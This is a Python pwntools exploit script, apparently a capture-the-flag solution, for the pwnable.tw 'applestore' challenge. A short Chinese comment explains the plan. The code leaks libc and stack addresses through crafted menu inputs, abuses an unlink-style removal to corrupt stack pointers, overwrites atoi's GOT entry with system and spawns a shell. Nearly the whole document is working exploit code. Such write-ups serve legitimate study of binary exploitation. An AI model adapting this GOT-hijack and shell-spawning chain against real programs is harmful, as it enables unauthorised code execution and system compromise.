'''
iphone8的结构体在栈上，利用atoi'\x00'截断的特性，且read的buf恰好在iphone8前面，可以修改iphone8结构体造成
任意地址读,程序里删除过程类似于unlink可以通过修改iphone8的fd、bk将ebp地址改为atoi_got附近，再次read时，
可以构造payload，既把got劫持为system，又能同时执行system("sh")
'''
from pwn import *

context.log_level = 'debug'
prog = './applestore'
elf = ELF(prog)
p = process(prog)

libc = ELF("libc_32.so.6")
#/lib/i386-linux-gnu/libc-2.23.so")
p = remote("chall.pwnable.tw" ,10104)

def dbg(b= ''):
    gdb.attach(p, b)
    if b == '':
    	p.interactive()

def buy(idx):
	p.sendlineafter("> ", '2')
	p.sendlineafter("Number> ", str(idx))
def remov(idx):
	p.sendlineafter("> ", '3')
	p.sendlineafter("Number> ", str(idx))
def list():
	p.sendlineafter("> ", '4')
	p.sendlineafter("> ", 'y')
def check():
	p.sendlineafter("> ", '5')
	p.sendlineafter("> ", 'y')
def exp():
	for _ in range(20):
		buy(2)
	for _ in range(6):
		buy(1)
	check()
	#dbg('b*0x8048bfd')
	payload = 'y\x00'+p32(elf.got['puts'])+p32(1)+p32(0)*2
	p.sendlineafter("> ", '4')
	p.sendlineafter("> ", payload)
	p.recvuntil("27: ")
	puts_addr = u32(p.recv(4))
	libc.address = puts_addr - libc.sym['puts']
	log.info("libc.address ==> " + hex(puts_addr))
	payload = 'y\x00'+p32(libc.sym['environ'])+p32(1)+p32(0)*2
	p.sendlineafter("> ", '4')
	p.sendlineafter("> ", payload)
	p.recvuntil("27: ")
	stack = u32(p.recv(4))
	log.info("stack ==> " + hex(stack))
	ebp = stack - 0x104
	payload = '27'+p32(stack)+p32(1)+p32(ebp-12)+p32(elf.got['atoi']+0x22-4)
	p.sendlineafter("> ", '3')
	p.sendlineafter("> ", payload)
	sleep(0.1)
	p.sendline("sh\x00\x00"+p32(libc.sym['system']))
	p.interactive()
if __name__ == '__main__':
	exp()
